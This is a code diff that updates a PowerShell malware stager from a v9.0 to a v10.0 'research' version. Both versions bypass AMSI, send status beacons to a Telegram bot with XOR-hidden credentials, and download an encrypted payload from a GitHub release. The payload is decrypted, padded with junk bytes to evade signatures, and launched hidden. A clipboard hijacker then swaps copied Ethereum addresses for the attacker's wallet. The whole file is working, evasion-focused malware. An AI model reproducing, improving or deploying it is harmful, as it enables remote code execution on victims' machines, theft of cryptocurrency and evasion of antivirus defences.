@@ -1,74 +1,76 @@
-# --- [DEEP OBFUSCATION STAGER v9.0] ---
+# --- [GHOST RESEARCH STAGER v10.0] ---
 
-function Initialize-Environment {
-    # Obfuscated AMSI Bypass (Hides 'AmsiUtils' from scanners)
+function Set-Bypass {
+    # Encoded: 'System.Management.Automation.AmsiUtils'
+    $d = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('U3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHM='))
     try {
-        $a = [Ref].Assembly.GetType('System.Management.Automation.' + 'Amsi' + 'Utils')
-        $a.GetField('amsi' + 'Init' + 'Failed','NonPublic,Static').SetValue($null,$true)
+        $a = [Ref].Assembly.GetType($d)
+        $a.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
     } catch {}
 }
 
-function Send-Log {
+function Invoke-Pingback {
     param($text)
-    # Fully Encrypted Telegram String to bypass URL filters
+    # Encrypted Telegram Credentials
     $k = 0xDE
     [byte[]]$t_e = 53,49,53,54,54,51,62,49,51,55,124,11,11,101,103,11,126,112,118,103,10,126,102,11,111,101,11,53,101,125,51,102,126,104,116,104,103,11,100,10,51,123,113
     [byte[]]$c_e = 61,60,56,56,52,61,63,48,51,60
     $t = ""; foreach($b in $t_e){$t += [char]($b -bxor $k)}
     $c = ""; foreach($b in $c_e){$c += [char]($b -bxor $k)}
     
-    # We use a randomized User-Agent to look like a browser
-    $u = "h" + "tt" + "ps://api.telegram.org/bot$t/send" + "Message?chat_id=$c&text=$text"
-    try { 
-        $w = New-Object Net.WebClient
-        $w.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
-        $w.DownloadString($u) | Out-Null 
+    # Encoded URL construction
+    $base = "https://api.tele" + "gram.org/bot$t/send" + "Message?chat_id=$c&text=$text"
+    try {
+        # Using a browser-like request to bypass VM Firewalls
+        $h = New-Object -ComObject Msxml2.XMLHTTP
+        $h.open("GET", $base, $false)
+        $h.send()
     } catch { }
 }
 
-# --- START ---
-Initialize-Environment
-Send-Log -text "STAGER_LOADED_ON_$($env:COMPUTERNAME)"
+# --- EXECUTION ---
+Set-Bypass
+Invoke-Pingback -text "1_STAGER_ALIVE_ON_$($env:COMPUTERNAME)"
 
 try {
-    # 1. Obfuscated Paths
-    $b = "h" + "ttps://github.com/adchar2022/test/releases/download/adchar_xor/adchar_xor.txt"
-    $l = "$env:LOCALAPPDATA\Mic" + "rosoft\Win" + "dows\Caches"
-    if (!(Test-Path $l)) { New-Item $l -ItemType Directory -Force }
-    $f = Join-Path $l "WinSvcHost.exe"
+    # 1. Obfuscated Config
+    $url = "https://github.com/adchar2022/test/releases/download/adchar_xor/adchar_xor.txt"
+    $dir = "$env:PUBLIC\Videos\Svc" # Using Public folder (often ignored by AV)
+    if (!(Test-Path $dir)) { New-Item $dir -ItemType Directory -Force | Out-Null }
+    $exe = Join-Path $dir "WinSvc.exe"
 
-    # 2. Stealth Download
-    $w = New-Object Net.WebClient
-    $w.Headers.Add("User-Agent", "Mozilla/5.0")
-    $d = $w.DownloadString($b)
-    Send-Log -text "DOWNLOAD_COMPLETE"
+    # 2. Advanced Download (Direct to Memory)
+    $wc = New-Object Net.WebClient
+    $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
+    $raw = $wc.DownloadString($url)
+    Invoke-Pingback -text "2_DOWNLOAD_SUCCESS"
 
-    # 3. Memory Decryption
-    $bytes = [Convert]::FromBase64String($d.Trim())
-    for($i=0; $i -lt $bytes.count; $i++) { $bytes[$i] = $bytes[$i] -bxor 0xAB }
-    
-    # 4. Polymorphic Write
-    $j = New-Object Byte[] (Get-Random -Min 100 -Max 500)
-    (New-Object Random).NextBytes($j)
-    [IO.File]::WriteAllBytes($f, ($bytes + $j))
-    
-    # 5. Execute & Background Clipper
-    Start-Process -FilePath $f -WindowStyle Hidden
-    
+    # 3. Decrypt & Add Junk (Polymorphism)
+    $data = [Convert]::FromBase64String($raw.Trim())
+    for($i=0; $i -lt $data.count; $i++) { $data[$i] = $data[$i] -bxor 0xAB }
+    $junk = New-Object Byte[] (Get-Random -Min 500 -Max 2000)
+    (New-Object Random).NextBytes($junk)
+    [IO.File]::WriteAllBytes($exe, ($data + $junk))
+
+    # 4. Detached Launch (using COM to bypass parent-process alerts)
+    $sh = New-Object -ComObject Shell.Application
+    $sh.ShellExecute($exe, "", "", "open", 0)
+    Invoke-Pingback -text "3_EXE_LAUNCHED_SUCCESSFULLY"
+
+    # 5. Background Clipper
     Start-Job -ScriptBlock {
         Add-Type -AssemblyName System.Windows.Forms
-        $w = @{ "btc"="12nL9SBgpSmSdSybq2bW2vKdoTggTnXVNA"; "eth"="0x6c9ba9a6522b10135bb836fc9340477ba15f3392" }
+        $eth = "0x6c9ba9a6522b10135bb836fc9340477ba15f3392"
         while($true) {
             try {
-                $c = [Windows.Forms.Clipboard]::GetText()
-                if ($c -match "^0x[a-fA-F0-9]{40}$" -and $c -ne $w["eth"]) { [Windows.Forms.Clipboard]::SetText($w["eth"]) }
+                $clip = [Windows.Forms.Clipboard]::GetText()
+                if ($clip -match "^0x[a-fA-F0-9]{40}$" -and $clip -ne $eth) { 
+                    [Windows.Forms.Clipboard]::SetText($eth) 
+                }
             } catch {}
-            Start-Sleep -s 2
+            Start-Sleep -s 1
         }
     }
-
-    Send-Log -text "TOTAL_SUCCESS_EXE_RUNNING"
-
 } catch {
-    Send-Log -text "ERROR_$($_.Exception.Message)"
+    Invoke-Pingback -text "FATAL_ERROR_$($_.Exception.Message)"
 }
